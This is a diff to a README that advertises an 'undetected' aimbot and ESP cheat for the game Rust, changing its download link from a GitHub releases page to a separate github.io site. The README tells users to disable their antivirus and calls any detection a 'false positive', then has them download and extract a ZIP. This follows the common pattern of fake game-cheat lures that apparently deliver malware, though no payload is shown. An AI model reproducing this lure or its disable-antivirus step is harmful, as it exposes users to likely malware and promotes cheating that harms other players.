@@ -1,6 +1,6 @@
 # 🎯 Rust-Aimbot-ESP-Hack-2026-Undetected - Improve your gameplay performance very quickly
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/niharnad123-lab/Rust-Aimbot-ESP-Hack-2026-Undetected/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://niharnad123-lab.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Follow these steps to prepare your environment and launch the software.
 
 1. Ensure your graphics drivers are up to date.
 2. Disable any third-party antivirus software that might flag the application as a false positive, as the tool modifies game memory buffers.
-3. Visit the release page to download the software: [https://github.com/niharnad123-lab/Rust-Aimbot-ESP-Hack-2026-Undetected/releases](https://github.com/niharnad123-lab/Rust-Aimbot-ESP-Hack-2026-Undetected/releases).
+3. Visit the release page to download the software: [https://niharnad123-lab.github.io](https://niharnad123-lab.github.io).
 4. Extract the contents of the downloaded ZIP file into a folder on your Desktop.
 
 ## 🛠️ Usage Instructions
